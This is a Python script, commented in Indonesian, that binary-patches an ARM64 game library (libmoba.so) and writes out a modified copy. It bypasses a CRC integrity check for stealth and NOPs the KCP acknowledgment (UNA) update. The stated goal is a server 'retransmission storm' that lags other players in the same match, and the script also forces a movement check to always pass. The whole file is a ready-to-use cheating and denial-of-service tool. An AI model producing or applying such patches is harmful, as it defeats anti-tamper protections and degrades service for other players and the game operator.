import os

# Alamat/Offset yang diidentifikasi dalam libmoba.so (ARM64)
OFFSETS = {
    'IKCP_MTU_DEF': 0x1c70c8,
    'IKCP_WND_SND': 0x1c70c0,
    'IKCP_WND_RCV': 0x1c70c4,
    'IKCP_INTERVAL': 0x1c70d0,
    'KCP_IsZipEnabled': 0xca7b0,
    'KCP_EnableZip': 0xca7a0,
    'g_iZipControlCode': 0x1c7088,
    'Native_Support_Move': 0xa7c84,
    'CRC_Bypass_Branch': 0xcca14,
    'UNA_Spam_Nop': 0xcfc40  # Titik di mana rcv_nxt di-encode ke paket (UNA)
}

def create_poc_final():
    source = 'libmoba.so'
    target = 'lib-moba-test.so'

    if not os.path.exists(source):
        print(f"Error: {source} tidak ditemukan!")
        return

    with open(source, 'rb') as f:
        data = bytearray(f.read())

    print(f"[*] Memulai patching {source} (Strategy: UNA Retransmission Storm)...")

    # 1. Tuning Network (Stable High Throughput)
    data[OFFSETS['IKCP_MTU_DEF']:OFFSETS['IKCP_MTU_DEF']+4] = (1400).to_bytes(4, 'little')
    data[OFFSETS['IKCP_INTERVAL']:OFFSETS['IKCP_INTERVAL']+4] = (50).to_bytes(4, 'little')
    data[OFFSETS['IKCP_WND_SND']:OFFSETS['IKCP_WND_SND']+4] = (256).to_bytes(4, 'little')
    data[OFFSETS['IKCP_WND_RCV']:OFFSETS['IKCP_WND_RCV']+4] = (256).to_bytes(4, 'little')

    # 2. Patch CRC Bypass (Stealth)
    data[OFFSETS['CRC_Bypass_Branch']:OFFSETS['CRC_Bypass_Branch']+4] = bytes.fromhex('1f2003d5')

    # 3. Patch UNA Logic (The "Other Players" Lag Vector)
    # Di ikcp_flush, rcv_nxt di-copy ke paket. Kita bisa 'mematikan' update ini
    # agar server mengira kita belum menerima paket apa pun, sehingga server
    # terus membanjiri kita (dan pemain lain di sesi yang sama) dengan retransmisi.
    # NOP-kan instruksi yang meng-update pointer paket setelah UNA
    # Offset ini perkiraan dari ikcp_flush dump
    data[0xcfc44:0xcfc48] = bytes.fromhex('1f2003d5')

    # 4. Native Support Move (Always True)
    patch_val = bytes.fromhex('20008052c0035fd6')
    data[OFFSETS['Native_Support_Move']:OFFSETS['Native_Support_Move']+8] = patch_val

    with open(target, 'wb') as f:
        f.write(data)

    print(f"[+] Berhasil membuat {target} (Versi: Global Stress)")
    print("[!] Hati-hati: Strategi UNA Spam dapat membebani sesi pertandingan secara keseluruhan.")

if __name__ == "__main__":
    create_poc_final()
